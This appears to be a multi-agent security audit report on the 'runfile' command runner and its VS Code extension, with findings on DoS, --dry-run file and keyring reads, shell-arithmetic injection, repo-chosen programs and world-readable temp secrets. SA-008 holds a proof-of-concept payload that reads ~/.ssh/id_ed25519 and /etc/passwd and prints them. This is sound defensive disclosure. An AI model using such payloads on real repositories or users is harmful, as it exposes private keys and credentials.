[Also reported by `untrusted-repo`] Zero-to-one-click denial of service that executes none of the repo's code and needs no 'run'. Confirmed: during this audit `run --dir <repo> :list` on a runfiles/build.run symlinked to /dev/zero grew the `run` process to ~50 GB (kernel log 2026-10-03 01:45:56 -03: 'Out of memory: Killed process 244603 (run) total-vm:67123640kB, anon-rss:49847708kB ... oom_score_adj:100'; oom-kill task_memcg app-com.anthropic.Claude scope, task=run) and the memory exhaustion took down the whole desktop/editor session, not just the run process. A FIFO target instead hangs :list/:complete/--help indefinitely (verified: each stayed alive past a 5s timeout, killed by SIGTERM). The VS Code path makes it a folder-open DoS: cloning/opening a hostile repo is enough to exhaust the developer's RAM.

[Also reported by `cli`] Sustained hang of `run :list`, `run :generate`, `run :lint`, and shell tab-completion when invoked in an untrusted repo containing a FIFO *.run. No memory/CPU exhaustion and recoverable with Ctrl+C, so impact is minor, but it affects the Tab path that runs automatically. A regular-file check also closes the door on reading other special files (device nodes).

**Fix**

In walk_runs, do not descend into symlinked directories, or keep a visited-set of canonicalized directory paths (or device+inode pairs) and refuse to re-enter one, and apply a depth cap as scan_subprojects already does. The least invasive change is to classify entries with symlink_metadata and skip any entry that is a symlink (a `.run` target reached only through a symlinked directory is already unusual); real runfiles/ trees are shallow and do not rely on symlinked subdirectories. Combine with the file-type/size guard from the existing read_to_string finding so one helper handles both the walk and the read.

[Also reported by `untrusted-repo`] Before reading, reject non-regular files and bound the read. In runfile-discovery::walk_runs, require p.symlink_metadata() (or fs::metadata with an is_file() check that does NOT follow into devices/FIFOs) and skip entries that are not regular files, so a symlink/FIFO/device named *.run is never registered. In every reader of a .run/_shared.run path (list::facts, discovery::scope_of, target_help, cmd_lint, lsp::text_of, runtime::parse_file) replace std::fs::read_to_string with a bounded read: open the file, fstat it, refuse if len exceeds a sane cap (e.g. a few MB -- real runfiles are well under 1 KB; the repo's own 49 files total 545 lines), and use Read::take(CAP) so a growing/infinite source cannot exhaust memory. A shared helper (read_runfile(path) -> Option<String>) keeps the cap in one place.

[Also reported by `cli`] Before reading, require a regular file: in discovery walk_runs skip entries that are not regular files (e.g. check `p.symlink_metadata()`/`file_type().is_file()` rather than extension alone), or in list::facts/cmd_lint::shape stat the path and skip non-regular files. A FIFO/device/socket named *.run should be ignored, not read.

**⚠ Product impact**

*Type:* `behavior`

A project that deliberately symlinks a subdirectory inside runfiles/ (undocumented and unusual) would stop having targets discovered through the symlink. No shipped runfile relies on this.

*Safer rollout:* Prefer a visited-set over an outright symlink ban if symlinked subdirectories must stay supported; either way bound the recursion depth.

**References**

- https://cwe.mitre.org/data/definitions/674.html — CWE-674 Uncontrolled Recursion (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/400.html — CWE-400 Uncontrolled Resource Consumption (retrieved 2026-10-03)
- https://cwe.mitre.org/data/definitions/410.html — CWE-410 Insufficient Resource Pool / blocking on an unbounded wait (retrieved 2026-10-03)

*Reported independently by 3 agents: cli, untrusted-repo.*

---

#### SA-008: `run --dry-run` is not side-effect free: previewing a hostile repository reads and prints arbitrary local files, loads `.env-file`s, and unlocks the OS credential store to decrypt the repository's values with the user's keys

**Severity:** Medium | **Confidence:** Confirmed | **Category:** info-disclosure | **CWE-200** | **Component:** `crates/runfile-cli, crates/runfile-lang, crates/runfile-runtime`

**Location**

`crates/runfile-cli/src/main.rs:246-249`

```rust
// A preview is exempt: it changes nothing, and reading what a target would
	// do is a reasonable thing to want before deciding to set the project up at all.
	if !flags.dry_run {
		prepare::enforce(&cat, target)?;
	}
```

`crates/runfile-lang/src/functions.rs:1585-1592`

```rust
"read_file" if n == 1 => (|| {
			let p = resolve(&sc.base_dir, s(0)?);
			std::fs::read_to_string(&p) ...  // no dry_run guard
```

`crates/runfile-lang/src/functions.rs:1622-1626`

```rust
// Output, not a change to anything, so these run under `--dry-run` too ...
		"print" if n >= 1 => { let joined = ...; emit(sc, ...) }  // print/printf run under --dry-run
```

`crates/runfile-runtime/src/run.rs:300-307`

```rust
pub fn run_target_with(target: &Target, base: Props, r: &mut Runner<'_>) -> Result<(), RunError> {
	let props = base.extend(&target.body, &mut r.scope, false)?;
	// Env before the body: `.env-file` has to be readable by `{{ ENV.x }}`.
	build_env(&props, r)?;
	walk(&target.body, &props, r)
}
```

`crates/runfile-runtime/src/run.rs:534-540`

```rust
fn build_env(props: &Props, r: &mut Runner<'_>) -> Result<(), RunError> {
	let built = crate::env::for_props(props, &r.anchor, &r.scope.private_keys)?;
```

`crates/runfile-env/src/lib.rs:254-257`

```rust
if runfile_crypto::has_encrypted_values(&env_map) {
	let key_hex = resolve_decryption_key(&env_map, params.available_private_keys)?;
	runfile_crypto::decrypt_env_values(&mut env_map, &key_hex)
```

`crates/runfile-cli/src/main.rs:267-268`

```rust
host.dry_run = flags.dry_run;
host.keys = runfile_state::keyring_keys::all_private_keys;
```

`crates/runfile-runtime/src/run.rs:300-305`

```rust
let props = base.extend(&target.body, &mut r.scope, false)?;
// Env before the body: `.env-file` has to be readable by `{{ ENV.x }}`.
build_env(&props, r)?;
```

`crates/runfile-runtime/src/env.rs:113-118`

```rust
pub fn for_props(props: &Props, anchor: &Path, keys: &runfile_lang::Keys) -> ... {
	...
	build(props, anchor, &workdir, Some(&Provider(keys.clone())))
}
```

`crates/runfile-env/src/lib.rs:382-392`

```rust
let provider = available_private_keys.ok_or_else(...)?;
let private_keys = provider.keys();
runfile_crypto::find_matching_private_key(public_key, private_keys)
```

`crates/runfile-state/src/keyring_keys.rs:184-189`

```rust
pub fn all_private_keys() -> Vec<String> {
	let env_pool = std::env::var(ENV_PRIVATE_KEYS_VAR)...;
	merge_key_sources(env_pool, read_blob())
}
```

`crates/runfile-state/src/secret_service_store.rs:69-74`

```rust
let ss = SecretService::connect(EncryptionType::Dh).map_err(to_keyring_err)?;
let collection = ss.get_default_collection().map_err(to_keyring_err)?;
if collection.is_locked().map_err(to_keyring_err)? {
	collection.unlock().map_err(to_keyring_err)?;
}
```

**Attack path**

`--dry-run` is documented (CLAUDE.md, README, --help) as changing nothing and being 'a reasonable thing to want before setting a project up' -- i.e. safe to run against a repo you have NOT decided to trust. It sets scope.dry_run (dispatch.rs:267) which guards only the writing functions (write_file, temp_file, temp_dir, decrypt) and sleep/confirm. It does NOT guard the reading functions. `prepare()` still runs, so `_shared.run` `let` bindings and header property values are evaluated, and the target body is walked with every pure/read function executed: read_file, glob, file_exists, directory_exists, is_executable, lines, json_get/json_query/json_keys/json_type/json_format, now, uuid, base64_*, and crucially print/printf -- which are deliberately run under --dry-run (functions.rs:1622). read_file resolves against the anchor but accepts absolute paths and values built from ENV (`read_file(join_path(ENV.HOME, ".ssh/id_ed25519"))`, `read_file("/etc/passwd")`). Only `$`/exec captures, code_of, and the dispatched `run`/`$` lines are suppressed (spawn returns "" under dry_run). So a hostile repo ships a target whose body does `let k = read_file(join_path(ENV.HOME,".ssh/id_ed25519")) / print("exfil-key:", k)`: previewing it prints the victim's private key to stdout. Separately, when the chain supplies an encrypted `.env-file` value with a public-key line, env-building runs during the preview and reaches the key pool (keyring).

[Also reported by `runtime`] `run --dry-run <target>` is documented (CLAUDE.md, `--dry-run` under runfile-cli) as a preview that 'changes nothing... a reasonable thing to want before setting a project up at all', and it is exempt from the prepare gate (main.rs:247). But `run_target_with` calls `build_env` unconditionally before walking the body, regardless of `r.dry_run` (run.rs:304). `build_env` -> `env::for_props` -> `runfile_env::build_env`, which (1) reads every `.env-file` the declaration region names -- an arbitrary filesystem path: I confirmed an absolute `.env-file` outside the project anchor and a `../../outside.env` are both read -- and (2) when the file holds `encrypted:` values and declares `RUNFILE_ENCRYPTION_PUBLIC_KEY`, calls `resolve_decryption_key`, which calls `provider.keys()` -> the deferred `Keys` pool -> `runfile_state::keyring_keys::all_private_keys`, i.e. the OS credential store (Secret Service / Keychain / Windows Credential Manager). Reproduced in an isolated harness (DBUS pointed at a nonexistent socket): a target with `.env-file=".env.secret"` where the file has `RUNFILE_ENCRYPTION_PUBLIC_KEY=deadbeef` and `SECRET=encrypted:...` made `run --dry-run` reach `Found RUNFILE_ENCRYPTION_PUBLIC_KEY in env but no matching private key is configured` -- which is only produced *after* the key pool has been loaded (the public-key check at env/lib.rs:371 passes, then `provider.keys()` at :391 runs). Dispatch recurses under dry-run too, so each dispatched target repeats the file reads (the key pool itself is memoized once per run).

[Also reported by `secrets-crypto`] Threat (a): processing a repository the user has not asked to run. A repository ships `.env` with `RUNFILE_ENCRYPTION_PUBLIC_KEY=<any value>` and `X=encrypted:<anything>`, and `.env-file = ".env"` in a target or in runfiles/_shared.run (which reaches every target). The user previews with `run --dry-run build` -- README: 'Print what would run, without running it'; CLAUDE.md: dry-run is not gated by prepare because reading what a target would do 'is a reasonable thing to want before setting a project up'. run_target_with builds the environment before the walk whatever dry_run says; with an encrypted value present, resolve_decryption_key calls provider.keys() -> Keys::get -> all_private_keys -> read_blob -> Secret Service connect and `collection.unlock()` if locked, else keyutils. Reproduced with strace (keyutils syscalls injected to fail, D-Bus pointed at a nonexistent socket): `--dry-run build` and `--dry-run other` (reached only through _shared.run) each attempted the session-bus connection and a keyctl call; `:list`, `build --help`, `:lint --check`, `:complete` and a full LSP session (initialize, didOpen, hover) attempted neither. With a public key that matches one of the user's keys, the repository also chooses which ciphertexts get decrypted with them (e.g. ones copied from the user's other public projects), and the preview prints the result (printing is the runtime agent's finding).

**Why existing controls don't stop it**

scope.dry_run guards write_file/decrypt/temp_file/temp_dir (functions.rs:1645-1703) and sleep/confirm, but read_file/glob/file_exists/directory_exists/is_executable/json_*/print/printf have no dry_run branch -- they run exactly as in a real run. The `.watch` probe (header_props) is skipped under --dry-run (main.rs:273), but prepare() + the body walk are not. No sandbox, no path confinement: resolve() joins against the anchor but an absolute path or an ENV-derived path escapes it entirely. This is NOT the runtime agent's '--dry-run prints the rendered command' finding: that is about the preview TEXT echoing a secret the target interpolates into a command line; this is that --dry-run actively EXECUTES arbitrary file reads and runs print(), giving a hostile repo a read-anything-and-exfiltrate primitive from a command the docs call safe. The VS Code CodeLens/tasks use --stdin-args, not --dry-run, so the entry point here is a human typing `run --dry-run <target>` to inspect an unfamiliar repo.

[Also reported by `runtime`] `header_props` (the `.watch` probe) is correctly skipped under `--dry-run` (main.rs:273), and captures/`$` lines correctly do not execute under dry-run (exec.rs:306-310, verified: no marker files created). But the env build is a separate, unconditional step with no dry-run guard. `Scope.dry_run` gates `write_file`/`decrypt`/`confirm` but not `.env-file` reading or key-pool loading. keys.rs tests pin that a plain target loads 0 keys and an encrypted one loads exactly once -- but only for a real run (`Host::new` defaults `dry_run=false`); no test covers the dry-run path, so this is unpinned. Distinct from the existing runtime finding on secrets in `--dry-run` output (that one is about the rendered value reaching stdout); this is about the preview's *side effects*: reading arbitrary files and querying the credential store.

[Also reported by `secrets-crypto`] Scope.dry_run gates captures, write_file, decrypt(), sleep and confirm, but not env building or the key pool. Keys is lazy, loading only when an encrypted value is present -- and the repository decides that. A dry run executes no commands, so there is no exfiltration path; the harm is the keyring interaction itself.

**Impact**

Arbitrary file-content disclosure of anything the invoking user can read (SSH keys, ~/.aws/credentials, /etc/passwd, tokens), printed to the terminal, from a command documented as a safe way to inspect a repo before trusting it. Reproduced on the HEAD debug binary: a target doing read_file of a stand-in `~/.ssh/id_ed25519` and `/etc/passwd`, then print(), under `run --dry-run preview` printed `exfil-key: FAKE-SSH-KEY-0000` and `passwd-lines: 52`, and glob('~/.ssh/*') listed the key file. With an encrypted `.env-file` present, the same preview reached the keyring (strace showed a keyctl call and the 'could not load private keys' warning), so on a machine with a locked Secret Service a preview can also provoke an unlock prompt or block.

[Also reported by `runtime`] Previewing an unprepared/untrusted repository with `run --dry-run <target>` reads arbitrary `.env-file` paths the target names and queries the OS keyring. Per the project's own note (MEMORY: 'Secret Service calls block forever' when locked), a locked keyring blocks the preview indefinitely (DoS), or pops an interactive unlock prompt, during what is advertised as a no-op. If the user's store does hold a matching private key, the secret is then decrypted and (per the separate finding) printed in the trace. The threat model (project-map item a) lists `--dry-run` as an entry point that must not touch the keyring.

[Also reported by `secrets-crypto`] An unrequested credential-store unlock prompt attributed to `run` (which users are conditioned to approve, since real runs ask the same way), a preview that never returns on a locked keyring (secret_service_store has no timeout), and the user's private keys applied to attacker-chosen ciphertext with output to the terminal. Low.

**Fix**

Treat --dry-run as a preview of effects AND of reads a target would perform against the environment: either (a) gate read_file/glob/file_exists/directory_exists/is_executable and print/printf behind sc.dry_run the way the writers are gated (returning a placeholder and not reading), or (b) confine read_file/glob to the anchor subtree (reject absolute paths and `..` escapes) and skip .env decryption/keyring access entirely under dry_run. Option (a) is the safest for the stated threat model (previewing an untrusted repo); document that a preview no longer reads the filesystem. At minimum, do not evaluate `_shared.run` lets and do not build/decrypt env under --dry-run.

[Also reported by `runtime`] Do not load the key pool or read `.env-file`s solely to preview. Either (a) skip `build_env`'s decryption and `.env-file` I/O when `r.dry_run` -- building `ENV.*` from the inherited/exported layer plus literal `.env.X` properties, and rendering `{{ ENV.SECRET }}` from an `encrypted:`/absent value as a placeholder -- or (b) pass a null `PrivateKeyProvider` under dry-run so `resolve_decryption_key` reports 'not decrypted (preview)' without touching the store, and read `.env-file`s with a size cap. Keep captures' existing no-op behaviour.

[Also reported by `secrets-crypto`] Under dry-run, never load the pool: pass `available_private_keys: None` from env::for_props when Scope.dry_run is set, and have build_env replace each `encrypted:` value with a placeholder such as `<encrypted X>` instead of failing (e.g. a `decrypt: bool` in EnvBuildParams). Alternatively allow RUNFILE_PRIVATE_KEYS but never the OS store during a preview.

**⚠ Product impact**

*Type:* `behavior`

Gating reads under --dry-run changes what a preview prints: a target that reads a config file and prints a value would show a placeholder instead of the real value during a preview. Authors who rely on --dry-run to see computed values would see less. Confining read_file to the anchor would reject targets that deliberately read absolute paths, even in a real run if applied there (do not).

*Safer rollout:* Apply read-gating only under dry_run (not to real runs), and emit a one-line note that reads are suppressed in a preview; or confine only the dry-run reads to the anchor.

**References**

- https://cwe.mitre.org/data/definitions/200.html — CWE-200 Exposure of Sensitive Information (retrieved 2026-10-03)

*Reported independently by 3 agents: runtime, secrets-crypto, untrusted-repo.*

---

#### SA-009: Interpolation in a shell arithmetic context is evaluated as code, with no quotes written and no shell-check finding

**Severity:** Medium | **Confidence:** Confirmed | **Category:** injection | **CWE-78** | **Component:** `crates/runfile-shell`

**Location**

`crates/runfile-shell/src/words.rs:329-338`

```rust
pub(crate) fn arithmetic(&mut self, parts: &mut Vec<Part>) -> R<bool> {
	...
	if ch.hole.is_some() {
		self.i += 1;
		continue;
	}
```

`crates/runfile-shell/src/rules.rs:188-194, 389`

```rust
fn visit_parts(...) { for p in parts { if let Part::Subst { body: Some(b), .. } = p { visit(b, around, f); } } }
...
Visit::Arith(..) | Visit::Function(_) => {}
```

`crates/runfile-lang/src/value.rs:101-106`

```rust
pub fn to_shell(&self) -> String { ... other => shell_quote(&other.to_string()), }
```

**Attack path**

The self-quoting promise (README 'Interpolation quotes itself', keywords.rs:24-26 hover text 'never needs quoting') holds only where bash honours single quotes. Bash treats the inside of an arithmetic expansion or command as double-quoted, and evaluates the operands of [[ -eq/-gt... ]], [[ -v ]], printf -v, let, declare -i, substring offsets and array subscripts as arithmetic/name expressions after quote removal. A string value (ARG/ARGS from a CI branch, tag or PR title, ENV, captured output) interpolated UNQUOTED into one of these positions is therefore evaluated by the local bash, and an embedded command substitution or array-subscript expression runs. Verified on the HEAD debug binary with bash 5.2.21 using scratch fixtures whose payload only created a marker file: $(( )), (( )), [[ x -eq ]], [[ x -gt ]], [[ -v ]], printf -v, let, declare -i, ${x:off} and arr[...]= all executed the payload; `[`/`test -eq` did not. `run :lint --check` reported 'no errors' for every fixture. This is a distinct context from the existing HIGH (double quotes / heredoc): here the author wrote no quotes at all, exactly as the docs instruct.

**Why existing controls don't stop it**

runfile-shell never sees these holes: words.rs:335-338 skips a hole inside arithmetic without recording a Part, rules.rs visit_parts (188-194) descends only into $(...) bodies, and Visit::Arith is ignored (389). quoted_interpolation only judges quoted holes, so an unquoted one in [[ ]] is never considered. The language checker's wrong-type rule covers only the language's own arithmetic. A corpus grep over ~1,257 local .run files found no current use of this pattern, which is what keeps it at medium rather than high.

**Impact**

Data-driven local command execution in a trusted runfile whenever an author interpolates a non-number value into shell arithmetic; on CI that runs with the job's secrets and decrypted .env values. Latent today (no corpus occurrence), but the documented rule actively leads authors to write it.

**Fix**

In runfile-shell, record holes inside arithmetic (push a Part::Hole with an Arith quote/position instead of skipping it at words.rs:335-338) and add a rule that refuses an interpolation in an arithmetic or name-evaluating position ($(( )), (( )), [[ ]] numeric operators and -v, let, declare -i, printf -v, substring offsets, array subscripts) unless the expression is statically a number (runfile_lang types: a number literal or number(...)); the fix line is `write {{ number(ARG.x) }}`. Alternatively, at render time refuse a non-Number value in those positions. Note the existing HIGH's proposed fixes (double-quote/heredoc awareness) do not cover this context, and README/keywords.rs text should say that values reaching shell arithmetic must be numbers.

**⚠ Product impact**

*Type:* `behavior`

Files that interpolate a string-typed value into shell arithmetic would be refused by the checker until wrapped in number(). No such file exists in the repository or the local corpus.

*Safer rollout:* Ship with a fix line pointing at number(); low churn given zero current occurrences.

**Regression test**

`crates/runfile-cli/tests/security_regression.rs` — status: `failed against 1.8.2; passes after the fix`

Run: `run test -- --test security_regression -- --ignored shell_arithmetic`

Observed failure: security_regression_an_interpolation_inside_shell_arithmetic_does_not_run_its_value: panicked at security_regression.rs:176: a value interpolated into $(( )) was run as a command (bash reported a syntax error after the command substitution had already run)

Passes once the fix is applied.

**References**

- https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic — Bash: arithmetic expressions are evaluated; expansion as if in double quotes (retrieved 2026-10-03)

---

#### SA-010: Opening a trusted workspace runs a program the repository chooses, with no click: window-scoped `runfile.catalogCommand` / `runfile.lspPath` in `.vscode/settings.json`, or (Windows) a `run.exe` in the folder that shadows the real runner

**Severity:** Medium | **Confidence:** Confirmed | **Category:** injection | **CWE-15** | **Component:** `editors/vscode`

**Location**

`editors/vscode/package.json:187-191`

```json
"runfile.catalogCommand": {
	"type": "string",
	"default": "run :list --json",
	"markdownDescription": "Shell command run in each workspace folder to list targets as JSON on **stdout** ...
```

`editors/vscode/package.json:212-216`

```json
"runfile.lspPath": {
	"type": "string",
	"default": "run",
	"description": "Path to the run executable, which is asked to serve the language server as `run :lsp`. Looked up on PATH when left as a bare name."
}
```

`editors/vscode/src/extension.ts:43-50`

```typescript
const config = vscode.workspace.getConfiguration("runfile")
if (config.get<boolean>("lsp", true)) {
	...
	const client = new LanguageClient(config.get<string>("lspPath", "run"), [":lsp"], output)
	client.start()
```

`editors/vscode/src/extension.ts:549-551`

```typescript
function commandFor(folder: vscode.WorkspaceFolder): string {
	return vscode.workspace.getConfiguration("runfile", folder.uri).get<string>("catalogCommand", DEFAULT_COMMAND)
}
```

`editors/vscode/src/catalog.ts:23-31`

```typescript
const [program, ...args] = command.split(/\s+/).filter((s) => s.length > 0);
...
execFile(
	program,
	args,
	{ cwd: folder.uri.fsPath, maxBuffer: 8 * 1024 * 1024 },
```

`editors/vscode/src/lsp.ts:105`

```typescript
this.child = spawn(command, args, { stdio: ["pipe", "pipe", "pipe"] });
```

`editors/vscode/src/catalog.ts:27-31`

```typescript
execFile(
	program,
	args,
	{ cwd: folder.uri.fsPath, maxBuffer: 8 * 1024 * 1024 },
```

`editors/vscode/src/extension.ts:594-603`

```typescript
const child = cp.spawn(this.command, this.args, {
	cwd: this.cwd,
	env,
	stdio: ["pipe", "pipe", "pipe"],
	...
	detached: true
})
```

**Attack path**

Neither setting declares a scope, so both default to 'window' and are honoured from workspace settings (.vscode/settings.json, or a .code-workspace file). A repository ships .vscode/settings.json with e.g. "runfile.catalogCommand": "./tools/list" (or "sh tools/x.sh", "node tools/x.js"). load() splits it on whitespace and execFile()s it with cwd = the workspace folder; a relative program resolves against that cwd (verified with the same call shape: ./tools/list in a scratch 'repo' ran and wrote its marker). It runs whenever the Runfile tree renders (getChildren -> collectEntries), on Run Task / fetchTasks, on Refresh, and on any runfile.* configuration change while the view is visible -- no Run click. runfile.lspPath is read at activation (onStartupFinished) and spawned immediately with the fixed argument ':lsp' and no cwd, so it is a weaker carrier (an attacker cannot add arguments, and a relative path resolves against the extension host's own cwd), but it executes on every window start of that workspace.

[Also reported by `editors`] Default catalogCommand 'run :list --json' becomes execFile('run', [':list','--json'], {cwd: <workspace folder>}). On Windows, libuv's uv_spawn passes the child's explicit cwd to search_path(), whose documented rule is: if there is only a filename, check the current directory first, then PATH, appending .com and then .exe. So <repo>\run.com or <repo>\run.exe is executed instead of the installed runner as soon as the tree renders or tasks are fetched -- no settings file needed, just a file at the repository root. The interactive task path (cp.spawn('run', args, {cwd})) has the same order at Run time, with cwd = the workspace folder for tree tasks or the runfiles parent (possibly a subproject directory) for the CodeLens button. The LSP spawn is not affected: it passes no cwd, and VS Code chdirs every Windows process to its application folder (bootstrap-node.ts setupCurrentWorkingDirectory).

**Why existing controls don't stop it**

Workspace Trust is the control that holds today: the extension declares no capabilities.untrustedWorkspaces, and VS Code disables such an extension in Restricted Mode; current docs say a newly opened folder opens in Restricted Mode with a banner, and workspace settings are restricted there. So nothing runs until the user trusts the folder -- or a parent folder, which trusts every repository later cloned beneath it without a prompt. VS Code's model allows extensions to run code automatically in a trusted workspace, which is why this is low. Nothing in the extension itself limits these settings: no scope, no restrictedConfigurations, no isTrusted check, no confirmation before a non-default catalog command.

[Also reported by `editors`] Requires a trusted workspace (extension disabled in Restricted Mode, which is the default state of a newly opened folder). Node refuses .bat/.cmd without a shell and libuv only tries .com/.exe, so the carrier is a PE file, which is conspicuous in a source repository but not checked by anything. Not reproduced on Windows (no Windows host here); the search order is taken from libuv's source.

**Impact**

In a trusted workspace (including trust inherited from a parent folder), the repository chooses an arbitrary program that the extension executes as the user as soon as the Runfile view is shown or tasks are listed -- before the user clicks Run on anything, and without `run`'s own guarantees (`:list` is documented as executing nothing).

[Also reported by `editors`] In a trusted workspace on Windows, repository-supplied native code runs as the user when targets are merely listed, silently shadowing a correctly installed `run` on PATH.

**Fix**

Declare "scope": "machine" (or at least "machine-overridable") for runfile.catalogCommand and runfile.lspPath, as VS Code's own git extension does for git.path ("scope": "machine"). Also declare "capabilities": {"untrustedWorkspaces": {"supported": false}} explicitly so the current safe default is visible and cannot regress silently; if limited support is ever added, list both settings in restrictedConfigurations. Optionally stop running a catalog command that differs from the default without a one-time confirmation.

[Also reported by `editors`] Resolve the runner to an absolute path before spawning (search process.env.PATH explicitly in the extension, skipping the workspace and any relative PATH entries), and run the catalog from a neutral cwd while naming the folder explicitly -- the CLI already honours `--dir` ahead of a subcommand (crates/runfile-cli/src/main.rs:116, 161-162, 354-357), so execFile(resolvedRun, ['--dir', folder.uri.fsPath, ':list', '--json'], { cwd: os.homedir() }) lists the same targets. Do the same for the interactive pty's spawn (it already passes --dir for CodeLens tasks).

**⚠ Product impact**

*Type:* `behavior`

With machine scope, a project can no longer set its own catalog command or runner path in .vscode/settings.json; anyone who does today (e.g. pointing lspPath at a repo-local build of run) would have to move the setting to user settings. machine-overridable keeps workspace overrides and therefore does not close the hole -- only machine does.

*Safer rollout:* Ship machine scope and mention it in the extension changelog; a project that needs a repo-local runner can document a user-level setting instead.

**References**

- https://code.visualstudio.com/api/extension-guides/workspace-trust — Undeclared extension is treated as not supporting Workspace Trust and is disabled in Restricted Mode; restrictedConfigurations returns only the user value in Restricted Mode (retrieved 2026-10-03)
- https://code.visualstudio.com/docs/editing/workspaces/workspace-trust — New folder opens in Restricted Mode with a banner; trusting a parent folder trusts subfolders; settings containing executable paths are restricted (retrieved 2026-10-03)
- https://code.visualstudio.com/api/references/contribution-points — Default configuration scope is 'window'; 'machine' settings can only be set in user/remote settings (retrieved 2026-10-03)
- https://raw.githubusercontent.com/microsoft/vscode/main/extensions/git/package.json — git.path declares "scope": "machine" (retrieved 2026-10-03)
- https://raw.githubusercontent.com/libuv/libuv/v1.x/src/win/process.c — search_path(): 'If there's really only a filename, check the current directory for file, then search all path directories'; uv_spawn passes options->cwd (explicit cwd) to search_path (retrieved 2026-10-03)
- https://raw.githubusercontent.com/microsoft/vscode/main/src/bootstrap-node.ts — setupCurrentWorkingDirectory(): on win32, process.chdir(path.dirname(process.execPath)) (retrieved 2026-10-03)
- https://nodejs.org/api/child_process.html — execFile shell default false, timeout default 0; .bat/.cmd cannot be launched via execFile (retrieved 2026-10-03)

*Reported independently by 2 agents: editors.*

---

#### SA-011: Decrypted secrets written by `temp_file()` / `temp_dir()` / `decrypt(src, dst)` are world-readable (default umask) and outlive the run on SIGTERM, SIGHUP, SIGPIPE or a panic

**Severity:** Medium | **Confidence:** Confirmed | **Category:** secrets | **CWE-276** | **Component:** `crates/runfile-lang (functions.rs) -- cross-reference: outside the runtime agent's file scope, found while tracing temp cleanup`

**Location**

`crates/runfile-lang/src/functions.rs:1685-1689`

```rust
let mut file = std::fs::OpenOptions::new()
	.write(true)
	.create_new(true)
	.open(&path)
```

`crates/runfile-lang/src/functions.rs:1702-1703`

```rust
let path = unique_temp_path(None);
match std::fs::create_dir(&path) {
```

`crates/runfile-lang/src/functions.rs:996-1009`

```rust
fn unique_temp_path(ext: Option<&str>) -> PathBuf {
	...
	let mut name = format!("runfile-{}-{n}-{nanos}", std::process::id());
	...
	std::env::temp_dir().join(name)
```

`crates/runfile-lang/src/functions.rs:1962`

```rust
std::fs::write(dst, out).map_err(|e| format!("could not write {}: {e}", dst.display()))
```

`crates/runfile-runtime/src/interrupt.rs:63-76`

```rust
#[cfg(unix)]
fn install_inner() {
	extern "C" fn on_sigint(_: libc::c_int) {
		INTERRUPTED.store(true, Ordering::SeqCst);
	}
	unsafe {
		libc::signal(libc::SIGINT, on_sigint as *const () as libc::sighandler_t);
	}
}
```

`crates/runfile-runtime/src/interrupt.rs:88-95`

```rust
unsafe extern "system" fn on_ctrl(kind: u32) -> BOOL {
	if kind == CTRL_C_EVENT || kind == CTRL_BREAK_EVENT {
		INTERRUPTED.store(true, Ordering::SeqCst);
		return TRUE;
	}
	FALSE
}
```

`crates/runfile-cli/src/main.rs:303-306`

```rust
let outcome = host.run(&first, &args);
// However it ended. A target that fails half-way is exactly when a decoded
// credential must not be left in the temp directory.
host.cleanup_temps();
```

`crates/runfile-runtime/src/run.rs:1028-1031`

```rust
handles
	.into_iter()
	.map(|h| h.join().expect("a parallel branch panicked"))
	.collect()
```

**Attack path**

A target puts a credential in a file for a tool that wants a path (`let kf = temp_file(decoded_key)`; `decrypt(".env.enc", out)`). `temp_file` opens with create_new but no `.mode(0o600)`, so the file gets 0666 & ~umask; `temp_dir` uses create_dir -> 0777 & ~umask. With TMPDIR unset (the Linux default) the path is /tmp/runfile-<pid>-<n>-<nanos>, which any local user can list. Observed in SCRATCH with umask 0002: `-rw-rw-r--` file, `drwxrwxr-x` dir; with the common 022 umask the file is 0644. Another local user can read it for the life of the run, and indefinitely if the run is killed (see the cleanup finding).

[Also reported by `runtime`] A target writes a secret to `temp_file(...)` (the documented purpose: CLAUDE.md says cleanup runs however the run ended because 'a decoded credential must not be left in the temp directory'). Cleanup is a plain call after `host.run` returns (main.rs:303-306, and main.rs:298 in the watch callback). Only SIGINT (Unix) and CTRL_C/CTRL_BREAK (Windows) are caught. Any other termination kills the process before that line: SIGTERM (CI job cancellation/timeouts, `timeout`, `docker stop`, systemd), SIGHUP (terminal window closed, SSH session dropped), SIGPIPE (`run x | head`, since ignore_broken_pipe restores the default disposition), Windows CTRL_CLOSE/LOGOFF/SHUTDOWN (handler returns FALSE). A panic also skips it (no Drop guard, no catch_unwind; release profile unwinds), e.g. a parallel-branch panic re-raised by `expect("a parallel branch panicked")`. Reproduced: target `let p = temp_file("STAND-IN-SECRET-NOT-REAL")` + `temp_dir()` + `$ sleep 20`; SIGTERM to run -> both left in TMPDIR (file 24 bytes, intact); SIGHUP -> both left; SIGINT to the group -> 0 left; `run chatty | head -1` (SIGPIPE, exit 141) -> 1 file left.

**Why existing controls don't stop it**

create_new stops symlink/clobber attacks but says nothing about readability. Names are not secret (pid + counter + nanos, and /tmp is listable). macOS ($TMPDIR per-user, 0700 parent) and Windows (%TEMP% under the profile) limit the exposure there; Linux /tmp does not.

[Also reported by `runtime`] Unique names + create_new prevent clobbering but not persistence. Nothing removes `runfile-<pid>-*` leftovers on a later run. No signal handler for SIGTERM/SIGHUP/SIGPIPE; no guard object whose Drop drains `Host::temps`. Watch mode has the same shape. On macOS and Windows TMPDIR/%TEMP% is per-user, which limits who can read a leftover; on Linux TMPDIR is commonly unset, so leftovers sit in shared /tmp (and see the separate finding: created 0644/0664).

**Impact**

Disclosure of decrypted secrets to other local accounts on multi-user Linux hosts and shared build machines.

[Also reported by `runtime`] Decrypted credentials persist on disk indefinitely after a common kind of interruption: readable by other local users on a shared Linux host (default mode is world-readable), by later jobs of other repositories on a persistent self-hosted CI runner that runs jobs as one account, and by backups/forensics of /tmp.

**Fix**

On Unix use `std::os::unix::fs::OpenOptionsExt::mode(0o600)` for temp_file and `DirBuilderExt::mode(0o700)` for temp_dir (or create every temp path inside one per-run 0700 directory); write `decrypt()`'s destination with 0600 (OpenOptions + mode, create/truncate) rather than `fs::write`.

